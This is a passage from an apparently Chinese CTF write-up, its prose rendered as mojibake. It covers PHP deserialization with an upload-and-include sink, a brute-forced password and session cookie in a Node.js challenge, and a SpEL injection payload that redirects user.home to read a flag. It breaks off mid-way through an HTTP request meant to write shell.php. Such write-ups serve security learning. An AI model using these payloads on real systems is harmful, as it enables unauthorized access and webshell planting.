<span class="token punctuation">&#123;</span>        <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$characters</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$randomString</span> <span class="token operator">.=</span> <span class="token variable">$characters</span><span class="token punctuation">[</span><span class="token variable">$r</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$randomString</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$readflag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">readflag</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">class</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token variable">$time</span> <span class="token operator">.</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$uploadDir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uploads/'</span><span class="token punctuation">;</span>                    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$randomStr</span> <span class="token operator">=</span> <span class="token function">generateRandomString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$newFilename</span> <span class="token operator">=</span> <span class="token variable">$time</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$randomStr</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">;</span>                    <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$newFilename</span><span class="token punctuation">;</span>                    <span class="token variable">$uploadedFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token variable">$uploadPath</span> <span class="token operator">=</span> <span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token variable">$newFilename</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cp "</span> <span class="token operator">.</span> <span class="token variable">$uploadedFile</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$uploadPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success upload!"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/:\/\//'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token variable">$file_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?|\:\/\/|ph|\?\=/i'</span><span class="token punctuation">,</span> <span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Illegal content detected in the file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token punctuation">;</span>        <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">readflag</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'class'</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'func'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'land'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'land'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'O:4:"test":N'</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆçœ‹ phpinfo</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PHP 7.4.33</p><p>disabled_functionsï¼š</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">call_user_func_array,call_user_func,create_function,ob_start,passthru,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åªèƒ½è°ƒç”¨æ— å‚ç±»æˆ–è€…æ–¹æ³•ï¼Œè€Œ php7 ä¸­çš„åŒ¿åç±»ä¸èƒ½è¢«ååºåˆ—åŒ–ï¼Œåªæœ‰ php8 æ‰èƒ½ä½¿ç”¨ä»£ç è¡Œçš„å†™æ³•æ¥è§¦å‘åŒ¿åç±»</p><p>é‚£åªèƒ½è°ƒ php è‡ªå·±çš„æºä»£ç äº†</p><hr><h1 id="CeleRaceï¼ˆUnsolvedï¼‰"><a href="#CeleRaceï¼ˆUnsolvedï¼‰" class="headerlink" title="CeleRaceï¼ˆUnsolvedï¼‰"></a>CeleRaceï¼ˆUnsolvedï¼‰</h1><hr><h1 id="anime"><a href="#anime" class="headerlink" title="anime"></a>anime</h1><blockquote><p>è€äºŒæ¬¡å…ƒTTXSMccè¿™å¤©åœ¨myanimelistä¸Šåˆ›å»ºäº†è‡ªå·±çš„å°å¤©åœ°ï¼Œåœ¨è¿™é‡Œï¼Œä»–è®°å½•äº†è‡ªå·±çš„äººç”Ÿä¿¡æ¡ï¼šâ€œå¥½å¥½å­¦ä¹ ï¼Œå¤©å¤©å‘ä¸Š~â€ï¼Œä»–æŠŠè‡ªæ¨çš„é‡è¦äº‹ç‰©æ”¾è¿›äº†è‡ªå·±çš„secretï¼Œä»–è¿˜å°†è‡ªå·±çš„äº”ä½å¹¸è¿æ•°å­—ä½œä¸ºäº†ä¿æŠ¤ä»–é‡è¦ä¸œè¥¿çš„å¯†ç ï¼Œä½ ä¸æƒ³çœ‹çœ‹å—ï¼Ÿ</p></blockquote><p>nodejsï¼Œé¦–é¡µå°±ç›´æ¥æŠ¥é”™</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Invalid or unexpected token <span class="token keyword">in</span> <span class="token operator">/</span>app<span class="token operator">/</span>views<span class="token operator">/</span>index<span class="token punctuation">.</span>ejs <span class="token keyword">while</span> compiling ejs If the above error is not helpful<span class="token punctuation">,</span> you may want to <span class="token keyword">try</span> <span class="token constant">EJS</span><span class="token operator">-</span>Lint<span class="token operator">:</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>RyanZim<span class="token operator">/</span><span class="token constant">EJS</span><span class="token operator">-</span>Lint Or<span class="token punctuation">,</span> <span class="token keyword">if</span> you meant to create an <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">,</span> pass <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">async: true</span><span class="token template-punctuation string">`</span></span> <span class="token keyword">as</span> an option<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‰´æƒå–å†³äº cookie çš„ session å’Œ sig</p><p>çˆ†ç ´å¯†ç å‡º 00799ï¼Œå…ˆè®°ä½ cookie</p><p><code>session=eyJmbGFzaCI6e30sInBhc3Nwb3J0Ijp7InVzZXIiOiJUVFhTTWNjIn19; session.sig=rqob-b6vHw7zRxm3uJCzOshKL84</code></p><p>æ³¨æ„åˆ° edit è¿™é‡Œçš„å‚æ•°ï¼ŒçŒœæµ‹æœ‰åŸå‹é“¾æ±¡æŸ“</p><p><img src="/blog/2025/10/18/%E5%BC%BA%E7%BD%91%E6%9D%AFS9/IMG-20251019103431378.png"></p><p>æµ‹è¯•å‘ç° usernameï¼Œsecretï¼Œrole ä¸è®©æ”¹</p><p>æ³¨æ„åˆ°ä¹‹å‰æµ‹è¯•ç™»å½•ç”¨æˆ·çš„æ—¶å€™ç”¨æˆ·åæ— è§†å¤§å°å†™ï¼Œè€ƒè™‘åˆ°è¿™é‡Œæœ‰ç¼“å­˜æœºåˆ¶ï¼Œå°è¯•ä¿®æ”¹è·¯ç”±ä¸ºå°å†™ç”¨æˆ· idï¼ŒæˆåŠŸåœ¨ secret è·å– flag</p><hr><h1 id="bbjv"><a href="#bbjv" class="headerlink" title="bbjv"></a>bbjv</h1><p>jdk21</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GatewayController</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">EvaluationService</span> evaluationService<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">GatewayController</span><span class="token punctuation">(</span><span class="token class-name">EvaluationService</span> evaluationService<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>evaluationService <span class="token operator">=</span> evaluationService<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/check"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">checkRule</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> rule<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>evaluationService<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>rule<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">File</span> flagFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.home"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>flagFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>flagFile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token class-name">String</span> content <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  result <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token string">"&lt;br>&lt;b>\ud83d\udea9 Flag:&lt;/b> "</span> <span class="token operator">+</span> content<span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œåªéœ€è¦ user.home ä¸‹æœ‰ flag.txt å³å¯è¿”å›</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> openjdk:21-jdk-slim</span><span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span><span class="token instruction"><span class="token keyword">COPY</span> app.jar /app/app.jar</span><span class="token instruction"><span class="token keyword">COPY</span> flag.txt /tmp/flag.txt</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 8080</span><span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œ flag.txt åœ¨ tmp ä¸‹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvaluationService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">EvaluationContext</span> context<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">EvaluationService</span><span class="token punctuation">(</span><span class="token class-name">EvaluationContext</span> context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">=</span> context<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token class-name">String</span> expression<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>expression<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TemplateParserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Result: "</span> <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"Error: "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"systemProperties"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Properties</span> <span class="token function">systemProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"restrictedEvalContext"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">EvaluationContext</span> <span class="token function">restrictedEvaluationContext</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Qualifier</span><span class="token punctuation">(</span><span class="token string">"systemProperties"</span><span class="token punctuation">)</span> <span class="token class-name">Properties</span> systemProperties<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SimpleEvaluationContext</span> simpleContext <span class="token operator">=</span> <span class="token class-name">SimpleEvaluationContext</span><span class="token punctuation">.</span><span class="token function">forPropertyAccessors</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PropertyAccessor</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">SecurePropertyAccessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        simpleContext<span class="token punctuation">.</span><span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token string">"systemProperties"</span><span class="token punctuation">,</span> systemProperties<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> simpleContext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œçš„ SPEL è¡¨è¾¾å¼ä½¿ç”¨çš„æ˜¯ SimpleEvaluationContext è§£æï¼Œé‚£ä¹ˆèƒ½ç”¨çš„è¡¨è¾¾å¼å°±æ²¡å‡ ä¸ªäº†</p><p>ç›´æ¥èµ‹å€¼å³å¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">#&#123;#systemProperties[&#39;user.home&#39;] &#x3D; &#39;&#x2F;tmp&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="yamcsï¼ˆUnsolvedï¼‰"><a href="#yamcsï¼ˆUnsolvedï¼‰" class="headerlink" title="yamcsï¼ˆUnsolvedï¼‰"></a>yamcsï¼ˆUnsolvedï¼‰</h1><hr><h1 id="æ—¥å¿—ç³»ç»Ÿï¼ˆå¤ç°ï¼‰"><a href="#æ—¥å¿—ç³»ç»Ÿï¼ˆå¤ç°ï¼‰" class="headerlink" title="æ—¥å¿—ç³»ç»Ÿï¼ˆå¤ç°ï¼‰"></a>æ—¥å¿—ç³»ç»Ÿï¼ˆå¤ç°ï¼‰</h1><p>å‚æ•°è¦†ç›–ï¼Œç„¶åæ„é€ ä¸å®Œæ•´æ•°ç»„å¯ä»¥ç»•è¿‡å†™æ–‡ä»¶çš„é™åˆ¶</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/api.php?timestamp[year]=3&amp;timestamp[month]=1&amp;timestamp[day]=042&amp;timestamp=&amp;timestamp[year][=shell.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">47.94.202.253:26705</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token 